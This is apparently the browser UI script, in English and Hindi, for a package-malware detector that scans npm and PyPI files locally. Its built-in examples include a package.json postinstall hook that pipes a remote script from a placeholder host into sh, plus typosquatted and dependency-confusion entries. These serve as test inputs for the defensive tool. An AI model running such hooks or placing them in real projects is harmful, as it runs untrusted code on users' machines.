/* ScamCheck package detector UI. Files and dependency lists never leave the browser. */
(function () {
  'use strict';

  var CFG = window.SCAMCHECK_CONFIG || {};
  var $ = function (id) { return document.getElementById(id); };

  var EX_RISKY = JSON.stringify({
    name: 'my-app',
    dependencies: { lodahs: '^4.17.21', expresss: '^4.18.0', 'private-lib': 'github:someone/private-lib', 'some-sdk': 'latest', react: '^18.2.0' },
    scripts: { postinstall: 'curl -s https://example.com/setup.sh | sh' },
  }, null, 2);
  var EX_REQ = 'requests==2.31.0\nreqeusts==1.0.0\nflask\nnumpy>=1.20\n--extra-index-url https://pypi.internal.example/simple\n--trusted-host pypi.internal.example\ngit+https://github.com/someone/lib.git@main#egg=lib\n';
  var EX_SAFE = JSON.stringify({ name: 'my-app', dependencies: { react: '^18.2.0', lodash: '^4.17.21', axios: '^1.6.8' }, scripts: { build: 'vite build', test: 'jest' } }, null, 2);

  var T = {
    en: {
      navMsg: 'Message checker', navApk: 'APK scanner', navMcp: 'MCP auditor', navPkg: 'Package detector',
      title: 'Is this package safe to install?',
      subtitle: 'Check an npm or PyPI package, or your dependency list, before you run npm install or pip install. Everything is read, nothing is executed.',
      privacy: '🔒 Analysed inside your browser. Your files and dependency lists are never uploaded.',
      aHeading: '1. Scan a package file',
      aHelp: 'Download the package without installing it, then drop the file here. These commands do not run any install scripts:',
      drop: 'Tap to choose a .tgz / .whl / .zip file, or drop it here', dropSub: 'npm tarball, Python wheel or sdist. Up to 150 MB.',
      bHeading: '2. Check a dependency file', inputLabel: 'Paste package.json, package-lock.json or requirements.txt', placeholder: '{ "dependencies": { ... } }',
      scan: 'Check dependencies', clear: 'Clear', tryExamples: 'Try an example',
      infoHeading: 'About this scan', whyHeading: 'Findings', whatToDo: 'What to do now', where: 'Where', fix: 'Fix',
      tipsHeading: 'Safer installs',
      donateHeading: 'Keep ScamCheck free',
      donateBody: 'This tool has no ads and no tracking. If it saved you or your family from a scam, a small contribution pays for development and hosting.',
      disclaimer: 'This is a static, rule-based scan. It cannot catch every attack (especially new or heavily obfuscated ones) and it can occasionally flag a harmless package. Treat a clean result as "no known red flags", never as proof of safety. For anything that matters, read the source and pin versions with a lockfile.',
      source: 'Open source (MIT)', payUpi: 'Pay with UPI', copyUpi: 'Copy UPI ID', copied: 'Copied!', upiNote: 'UPI ID: ',
      reading: 'Analysing… large packages can take a few seconds.',
      sev: { critical: 'Critical', high: 'High', medium: 'Medium', low: 'Low' }, x: 'times',
      k: { type: 'Scanned', ecosystem: 'Ecosystem', name: 'Name', version: 'Version', files: 'Files', size: 'Size', deps: 'Dependencies', hooks: 'Install hooks', sha: 'SHA-256', none: 'none' },
      levels: {
        clean: ['No known red flags', 'Nothing alarming found. Still pin the version and read what you install.'],
        caution: ['Look closer', 'A few weak signals. Check the details below before installing.'],
        suspicious: ['Looks suspicious', 'Several risky traits. Do not install unless you can verify the publisher and the source.'],
        likely: ['Likely malicious', 'Strong malware pattern. Do not install it.'],
        scam: ['Almost certainly malware', 'This matches known malicious package behaviour. Do not install or run it.'],
      },
      advice: [
        'Do not install it. If you already did, treat that machine and every secret on it as exposed.',
        'Rotate tokens that were in your environment (npm, PyPI, GitHub, cloud) and check your shell start-up files and cron.',
        'Report the package to npm or PyPI so others are protected.',
        'Install with scripts disabled (npm install --ignore-scripts) and in a throw-away container while you investigate.',
      ],
      adviceOk: ['Pin an exact version and commit a lockfile.', 'Prefer packages with a public repository, a long history and many users.'],
      tips: [
        'Type package names carefully. Typosquats ("lodahs", "reqeusts") are the most common way malware gets installed.',
        'Install hooks (postinstall, setup.py) run with your permissions the moment you install. Use --ignore-scripts when you can.',
        'Never use --extra-index-url for private packages. Use a single index or pin hashes to avoid dependency confusion.',
        'Commit lockfiles and review changes to them like code.',
        'Use npm pack / pip download to inspect a package first, and read the install scripts.',
      ],
      examples: [['Risky package.json', EX_RISKY], ['Dependency confusion', EX_REQ], ['Safe package.json', EX_SAFE]],
      errors: {
        not_archive: 'This is not a .tgz, .tar, .whl or .zip package file.',
        bad_archive: 'The archive is damaged, cut off or corrupted. Malware sometimes uses broken archives to dodge scanners: treat it with care.',
        empty_archive: 'The archive contains no files.',
        too_big: 'The file is too big (over 150 MB, or it expands to more than that).',
        unsupported: 'This browser cannot unzip files. Use a recent Chrome, Edge, Firefox or Safari.',
        empty: 'Paste a dependency file first.',
        bad_json: 'That looks like JSON but is not valid.',
        unrecognised: 'Could not recognise this. Paste a package.json, package-lock.json or requirements.txt.',
        other: 'Could not scan this input.',
      },
    },
    hi: {
      navMsg: 'मैसेज चेकर', navApk: 'APK स्कैनर', navMcp: 'MCP ऑडिटर', navPkg: 'पैकेज डिटेक्टर',
      title: 'क्या यह पैकेज इंस्टॉल करना सुरक्षित है?',
      subtitle: 'npm install या pip install चलाने से पहले npm/PyPI पैकेज या अपनी dependency सूची जाँचें। सब कुछ सिर्फ़ पढ़ा जाता है, कुछ चलता नहीं।',
      privacy: '🔒 जाँच आपके ब्राउज़र के अंदर होती है। आपकी फ़ाइलें और dependency सूची कभी अपलोड नहीं होतीं।',
      aHeading: '1. पैकेज फ़ाइल स्कैन करें',
      aHelp: 'पैकेज को इंस्टॉल किए बिना डाउनलोड करें, फिर फ़ाइल यहाँ डालें। ये कमांड कोई install script नहीं चलातीं:',
      drop: '.tgz / .whl / .zip फ़ाइल चुनने के लिए टैप करें, या यहाँ डालें', dropSub: 'npm tarball, Python wheel या sdist। 150 MB तक।',
      bHeading: '2. dependency फ़ाइल जाँचें', inputLabel: 'package.json, package-lock.json या requirements.txt पेस्ट करें', placeholder: '{ "dependencies": { ... } }',
      scan: 'Dependencies जाँचें', clear: 'साफ़ करें', tryExamples: 'उदाहरण आज़माएँ',
      infoHeading: 'इस स्कैन के बारे में', whyHeading: 'निष्कर्ष', whatToDo: 'अब क्या करें', where: 'कहाँ', fix: 'समाधान',
      tipsHeading: 'ज़्यादा सुरक्षित इंस्टॉल',
      donateHeading: 'ScamCheck को मुफ़्त रखने में मदद करें',
      donateBody: 'इसमें न विज्ञापन हैं न ट्रैकिंग। अगर इसने आपको या आपके परिवार को ठगी से बचाया, तो छोटा सा सहयोग डेवलपमेंट और होस्टिंग का खर्च उठाने में मदद करता है।',
      disclaimer: 'यह स्टैटिक, नियम-आधारित स्कैन है। यह हर हमला नहीं पकड़ सकता (ख़ासकर नए या भारी obfuscated), और कभी-कभी बेज़रर पैकेज को भी चिह्नित कर सकता है। साफ़ नतीजे को "कोई जाना-पहचाना खतरा नहीं" मानें, सुरक्षा का सबूत नहीं। ज़रूरी चीज़ों के लिए सोर्स पढ़ें और lockfile से वर्ज़न पिन करें।',
      source: 'ओपन सोर्स (MIT)', payUpi: 'UPI से दें', copyUpi: 'UPI ID कॉपी करें', copied: 'कॉपी हो गया!', upiNote: 'UPI ID: ',
      reading: 'जाँच हो रही है… बड़े पैकेज में कुछ सेकंड लग सकते हैं।',
      sev: { critical: 'गंभीर', high: 'ज़्यादा', medium: 'मध्यम', low: 'कम' }, x: 'बार',
      k: { type: 'जाँचा गया', ecosystem: 'इकोसिस्टम', name: 'नाम', version: 'वर्ज़न', files: 'फ़ाइलें', size: 'साइज़', deps: 'Dependencies', hooks: 'Install hooks', sha: 'SHA-256', none: 'कोई नहीं' },
      levels: {
        clean: ['कोई जाने-पहचाने खतरे नहीं', 'कुछ चिंताजनक नहीं मिला। फिर भी वर्ज़न पिन करें और जो इंस्टॉल करें उसे पढ़ें।'],
        caution: ['ज़रा ग़ौर से देखें', 'कुछ कमज़ोर संकेत हैं। इंस्टॉल से पहले नीचे का ब्योरा देखें।'],
        suspicious: ['संदिग्ध लगता है', 'कई जोखिम भरे लक्षण हैं। प्रकाशक और सोर्स की पुष्टि हुए बिना इंस्टॉल न करें।'],
        likely: ['शायद मैलवेयर है', 'मैलवेयर का मज़बूत पैटर्न है। इंस्टॉल न करें।'],
        scam: ['लगभग पक्का मैलवेयर', 'यह जाने-पहचाने दुर्भावनापूर्ण पैकेज के व्यवहार से मेल खाता है। इंस्टॉल या रन न करें।'],
      },
      advice: [
        'इंस्टॉल न करें। कर चुके हों तो उस मशीन और उसके हर सीक्रेट को उजागर मानें।',
        'आपके environment में जो टोकन थे (npm, PyPI, GitHub, क्लाउड) उन्हें रोटेट करें, और शेल स्टार्टअप फ़ाइलें व cron जाँचें।',
        'पैकेज को npm या PyPI पर रिपोर्ट करें ताकि दूसरे बचें।',
        'जाँच के दौरान scripts बंद करके (npm install --ignore-scripts) और फेंक देने लायक कंटेनर में इंस्टॉल करें।',
      ],
      adviceOk: ['सटीक वर्ज़न पिन करें और lockfile commit करें।', 'ऐसे पैकेज चुनें जिनकी पब्लिक रिपॉज़िटरी, लंबा इतिहास और कई यूज़र हों।'],
      tips: [
        'पैकेज के नाम ध्यान से टाइप करें। टाइपो-स्क्वैट ("lodahs", "reqeusts") मैलवेयर इंस्टॉल होने का सबसे आम तरीका हैं।',
        'Install hooks (postinstall, setup.py) इंस्टॉल होते ही आपकी अनुमतियों से चलते हैं। हो सके तो --ignore-scripts इस्तेमाल करें।',
        'प्राइवेट पैकेज के लिए --extra-index-url कभी न इस्तेमाल करें। dependency confusion से बचने के लिए एक ही index रखें या hash पिन करें।',
        'Lockfile commit करें और उसके बदलावों की कोड की तरह समीक्षा करें।',
        'पहले npm pack / pip download से पैकेज देखें और install scripts पढ़ें।',
      ],
      examples: [['जोखिम भरा package.json', EX_RISKY], ['Dependency confusion', EX_REQ], ['सुरक्षित package.json', EX_SAFE]],
      errors: {
        not_archive: 'यह .tgz, .tar, .whl या .zip पैकेज फ़ाइल नहीं है।',
        bad_archive: 'आर्काइव ख़राब, अधूरा या बिगाड़ा हुआ है। मैलवेयर कभी-कभी स्कैनर से बचने के लिए टूटे आर्काइव इस्तेमाल करता है: सावधानी रखें।',
        empty_archive: 'आर्काइव में कोई फ़ाइल नहीं है।',
        too_big: 'फ़ाइल बहुत बड़ी है (150 MB से ज़्यादा, या खुलकर उससे बड़ी हो जाती है)।',
        unsupported: 'यह ब्राउज़र ZIP नहीं खोल सकता। नया Chrome, Edge, Firefox या Safari इस्तेमाल करें।',
        empty: 'पहले dependency फ़ाइल पेस्ट करें।',
        bad_json: 'यह JSON जैसा दिखता है पर मान्य नहीं है।',
        unrecognised: 'पहचान नहीं हो सकी। package.json, package-lock.json या requirements.txt पेस्ट करें।',
        other: 'इस इनपुट की जाँच नहीं हो सकी।',
      },
    },
  };

  var lang = 'en';
  var last = null;
  try {
    var saved = localStorage.getItem('scamcheck-lang');
    if (saved === 'hi' || saved === 'en') lang = saved;
    else if ((navigator.language || '').toLowerCase().indexOf('hi') === 0) lang = 'hi';
  } catch (e) { /* storage may be blocked */ }

  function t() { return T[lang]; }
  function el(tag, cls, text) {
    var n = document.createElement(tag);
    if (cls) n.className = cls;
    if (text != null) n.textContent = text;
    return n;
  }
  function fmtSize(n) { return n > 1048576 ? (n / 1048576).toFixed(1) + ' MB' : Math.max(1, Math.round(n / 1024)) + ' KB'; }

  function applyStatic() {
    var s = t();
    document.documentElement.lang = lang;
    Array.prototype.forEach.call(document.querySelectorAll('[data-i18n]'), function (n) {
      var v = s[n.getAttribute('data-i18n')];
      if (typeof v === 'string') n.textContent = v;
    });
    Array.prototype.forEach.call(document.querySelectorAll('[data-i18n-ph]'), function (n) { n.setAttribute('placeholder', s[n.getAttribute('data-i18n-ph')]); });
    Array.prototype.forEach.call(document.querySelectorAll('.lang button'), function (b) { b.setAttribute('aria-pressed', String(b.getAttribute('data-lang') === lang)); });
    var tips = $('tips'); tips.textContent = '';
    s.tips.forEach(function (x) { tips.appendChild(el('li', null, x)); });
    var chips = $('chips'); chips.textContent = '';
    s.examples.forEach(function (ex) {
      var b = el('button', 'chip', ex[0]);
      b.type = 'button';
      b.addEventListener('click', function () { $('input').value = ex[1]; scanText(); });
      chips.appendChild(b);
    });
    renderDonate();
    if (last) render(last);
  }

  function row(dl, k, v, cls) { dl.appendChild(el('dt', null, k)); dl.appendChild(el('dd', cls, v)); }

  function render(r) {
    var s = t();
    var box = $('result');
    box.hidden = false;
    $('errorBox').hidden = true;
    box.setAttribute('data-level', r.level);
    var lv = s.levels[r.level];
    $('verdict-title').textContent = lv[0];
    $('verdict-sub').textContent = lv[1];
    var num = $('scoreNum');
    num.textContent = '';
    num.appendChild(document.createTextNode(String(r.score)));
    num.appendChild(el('small', null, '/100'));
    $('meterFill').style.width = r.score + '%';

    var i = r.info;
    var dl = $('info');
    dl.textContent = '';
    row(dl, s.k.type, i.format ? (i.fileName || i.format) + ' (' + i.format + ')' : i.kind);
    row(dl, s.k.ecosystem, i.ecosystem === 'pypi' ? 'PyPI' : i.ecosystem === 'npm' ? 'npm' : '?');
    if (i.name) row(dl, s.k.name, i.name, 'mono');
    if (i.version) row(dl, s.k.version, i.version);
    if (i.files != null) row(dl, s.k.files, String(i.files));
    if (i.size != null) row(dl, s.k.size, fmtSize(i.size));
    if (i.dependencies != null) row(dl, s.k.deps, String(i.dependencies));
    row(dl, s.k.hooks, i.hooks && i.hooks.length ? i.hooks.join('; ') : s.k.none, 'mono');
    if (i.sha256) row(dl, s.k.sha, i.sha256, 'mono');

    var list = $('findings');
    list.textContent = '';
    $('whyH').hidden = r.findings.length === 0;
    r.findings.forEach(function (f) {
      var li = el('li');
      li.setAttribute('data-sev', f.sev);
      li.appendChild(el('span', 'sev', (s.sev[f.sev] || f.sev) + (f.count > 1 ? ' · ' + f.count + ' ' + s.x : '')));
      li.appendChild(el('p', null, f[lang] || f.en));
      if (f.where && f.where.length) li.appendChild(el('p', 'small', s.where + ': ' + f.where.join(', ')));
      if (f.evidence) li.appendChild(el('code', null, f.evidence));
      var fix = lang === 'hi' ? f.fixHi : f.fixEn;
      if (fix) { var p = el('p', 'fixline'); p.appendChild(el('strong', null, s.fix + ': ')); p.appendChild(document.createTextNode(fix)); li.appendChild(p); }
      list.appendChild(li);
    });

    var act = $('actions');
    act.textContent = '';
    act.appendChild(el('h3', null, s.whatToDo));
    var ul = el('ul');
    (r.score >= 20 ? s.advice : s.adviceOk).forEach(function (x) { ul.appendChild(el('li', null, x)); });
    act.appendChild(ul);
  }

  function showResult(r) {
    last = r;
    render(r);
    var box = $('result');
    box.scrollIntoView({ behavior: window.matchMedia('(prefers-reduced-motion: reduce)').matches ? 'auto' : 'smooth', block: 'start' });
    box.focus({ preventScroll: true });
  }

  function showError(code) {
    $('result').hidden = true;
    last = null;
    $('errorText').textContent = t().errors[code] || t().errors.other;
    $('errorBox').hidden = false;
  }

  function scanText() {
    $('status').textContent = '';
    try { showResult(window.PkgScan.scanManifest($('input').value)); }
    catch (err) { showError(err && err.code ? err.code : 'other'); }
  }

  async function scanFile(file) {
    if (!file) return;
    $('errorBox').hidden = true;
    $('status').textContent = t().reading;
    try {
      if (file.size > window.PkgScan.MAX_FILE) { var e = new Error('big'); e.code = 'too_big'; throw e; }
      var buf = new Uint8Array(await file.arrayBuffer());
      var r = await window.PkgScan.scanArchive(buf, { fileName: file.name });
      $('status').textContent = file.name;
      showResult(r);
    } catch (err) {
      $('status').textContent = '';
      showError(err && err.code ? err.code : 'other');
    }
  }

  function safeHttps(u) { try { var p = new URL(u); return p.protocol === 'https:' ? p.href : null; } catch (e) { return null; } }

  function renderDonate() {
    var s = t();
    var box = $('donate');
    var btns = $('donateBtns');
    btns.textContent = '';
    var any = false;
    var upi = typeof CFG.upiId === 'string' ? CFG.upiId.trim() : '';
    if (/^[a-z0-9._-]{2,}@[a-z][a-z0-9]{1,}$/i.test(upi)) {
      any = true;
      var a = el('a', 'btn primary', s.payUpi);
      a.href = 'upi://pay?pa=' + encodeURIComponent(upi) + '&pn=' + encodeURIComponent(CFG.upiName || 'ScamCheck') + '&cu=INR&tn=' + encodeURIComponent('ScamCheck support');
      btns.appendChild(a);
      var c = el('button', 'btn', s.copyUpi);
      c.type = 'button';
      c.addEventListener('click', function () {
        if (navigator.clipboard && navigator.clipboard.writeText) navigator.clipboard.writeText(upi).then(function () {
          c.textContent = t().copied; setTimeout(function () { c.textContent = t().copyUpi; }, 1800);
        }, function () {});
      });
      btns.appendChild(c);
      var note = $('upiNote');
      note.hidden = false;
      note.textContent = s.upiNote + upi;
    }
    (Array.isArray(CFG.links) ? CFG.links : []).forEach(function (l) {
      var href = l && safeHttps(l.url);
      if (!href || !l.label) return;
      any = true;
      var b = el('a', 'btn', String(l.label));
      b.href = href; b.target = '_blank'; b.rel = 'noopener noreferrer';
      btns.appendChild(b);
    });
    box.hidden = !any;
  }

  var input = $('file');
  input.addEventListener('change', function () { scanFile(input.files && input.files[0]); input.value = ''; });
  var drop = $('drop');
  ['dragenter', 'dragover'].forEach(function (ev) { drop.addEventListener(ev, function (e) { e.preventDefault(); drop.classList.add('over'); }); });
  ['dragleave', 'drop'].forEach(function (ev) { drop.addEventListener(ev, function (e) { e.preventDefault(); drop.classList.remove('over'); }); });
  drop.addEventListener('drop', function (e) { scanFile(e.dataTransfer && e.dataTransfer.files && e.dataTransfer.files[0]); });
  $('scan').addEventListener('click', scanText);
  $('clear').addEventListener('click', function () { $('input').value = ''; last = null; $('result').hidden = true; $('errorBox').hidden = true; $('status').textContent = ''; $('input').focus(); });
  $('input').addEventListener('keydown', function (e) { if ((e.ctrlKey || e.metaKey) && e.key === 'Enter') scanText(); });
  Array.prototype.forEach.call(document.querySelectorAll('.lang button'), function (b) {
    b.addEventListener('click', function () {
      lang = b.getAttribute('data-lang');
      try { localStorage.setItem('scamcheck-lang', lang); } catch (e) { /* ignore */ }
      applyStatic();
    });
  });

  var repo = typeof CFG.repoUrl === 'string' && safeHttps(CFG.repoUrl);
  if (repo) $('repoLink').href = repo;
  $('ver').textContent = 'v' + window.PkgScan.VERSION;
  applyStatic();

  if ('serviceWorker' in navigator && (location.protocol === 'https:' || location.hostname === 'localhost')) {
    navigator.serviceWorker.register('sw.js').catch(function () {});
  }
})();
